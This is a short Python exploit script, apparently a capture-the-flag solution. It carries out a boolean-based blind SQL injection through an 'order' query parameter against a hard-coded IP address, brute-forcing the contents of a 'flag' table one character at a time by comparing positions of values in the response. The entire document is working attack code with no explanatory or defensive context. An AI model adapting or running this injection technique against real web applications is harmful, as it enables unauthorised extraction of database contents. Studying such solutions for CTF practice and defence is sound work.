import requests
import string

session = requests.Session()

url = "http://202.112.47.60:8003/"

def exp(pos,s):
    paramGet={
        'order':'if((select(ascii(mid(flag,{pos},1))^{ascii})from(flag)),name,price)'.format(pos=pos,ascii=ord(s))
    }
    response=session.get(url,params=paramGet)
    
    data=response.content
    judge=data.find(b'322')>data.find(b'233')
    
    if judge:
        return True
    else:
        return False
    
def hack():
    ss = string.printable
    
    num=30
    flag=''
    end=0
    for i in range(num):
        for s in ss:
            if exp(i,s):
                flag+=s
                print(flag)
                if flag[-1]=='}':
                    end=1
                    break
        if end==1:
            break
    print(flag)
    
if __name__=='__main__':
    hack()